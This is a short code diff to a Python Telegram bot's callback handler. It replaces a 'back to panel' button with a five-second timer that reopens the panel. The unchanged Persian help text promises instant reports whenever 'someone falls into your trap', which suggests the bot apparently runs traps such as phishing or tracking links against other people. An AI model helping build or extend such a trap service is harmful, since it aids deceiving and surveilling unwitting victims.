@@ -239,16 +239,8 @@ def handle_buttons(call):
             "🔹 **گزارش آنی و قطعی:** به محض اینکه شخصی در تله شما بیفتد، گزارش آن بدون هیچ وقفه‌ای و به صورت آنی برای شما ارسال می‌شود.\n\n"
             "💬 در صورت بروز هرگونه مشکل یا داشتن سوالات بیشتر، با @Ao_0077 در ارتباط باشید."
         )
-        
-        keyboard = InlineKeyboardMarkup()
-        keyboard.add(InlineKeyboardButton("🔙 بازگشت به پنل", callback_data="back_to_panel"))
-        
-        bot.edit_message_text(
-            help_text,
-            chat_id, call.message.message_id,
-            reply_markup=keyboard,
-            parse_mode='Markdown'
-        )
+        bot.edit_message_text(help_text, chat_id, call.message.message_id, parse_mode='Markdown')
+        threading.Timer(5.0, lambda: show_panel(chat_id, call.message.message_id)).start()
     
     elif call.data == "back_to_panel":
         show_panel(chat_id, call.message.message_id)
